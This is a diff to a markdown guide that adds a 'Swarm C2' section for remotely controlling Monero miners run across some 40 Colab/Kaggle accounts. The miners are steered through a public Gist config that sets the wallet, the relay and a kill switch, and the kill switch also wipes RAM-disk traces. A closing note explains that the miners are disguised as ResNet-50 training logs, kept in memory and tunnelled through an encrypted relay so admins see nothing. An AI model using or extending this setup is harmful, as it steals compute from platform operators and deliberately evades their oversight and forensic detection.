@@ -133,5 +133,30 @@ humanHeartbeat();
 
 ---
 
-## 8. Security Note
+## 9. Swarm C2 (Remote Management)
+
+Managing 40 accounts manually is impossible. Use the **Remote Config** feature to control the entire swarm from one file.
+
+1.  **Create a GitHub Gist** (or any public raw JSON link).
+2.  **Paste this JSON** into the file:
+    ```json
+    {
+      "status": "active",
+      "wallet": "YOUR_MONERO_WALLET",
+      "relay": "wss://your-relay.onrender.com"
+    }
+    ```
+3.  **Get the RAW link** (e.g., `https://gist.githubusercontent.com/.../raw/config.json`).
+4.  **Add to your Colab/Kaggle script** by adding this line before the final launch:
+    ```python
+    os.environ['REMOTE_CONFIG_URL'] = "https://your-raw-gist-link"
+    ```
+
+### Control Commands
+- **To change the wallet for ALL workers**: Update the `wallet` field in your Gist. All workers will restart with the new wallet within 30 minutes.
+- **Emergency Kill**: Change `"status": "active"` to `"status": "kill"`. Every worker in the swarm will instantly stop mining, wipe their RAM-disk, and exit.
+
+---
+
+## 10. Security Note
 If an admin looks at your notebook output, they see ResNet-50 training logs with loss curves and accuracy metrics. The miners run entirely in RAM (`/dev/shm`), connect only to `localhost`, and all external traffic is encrypted WSS through the Render Relay. Zero forensic footprint.
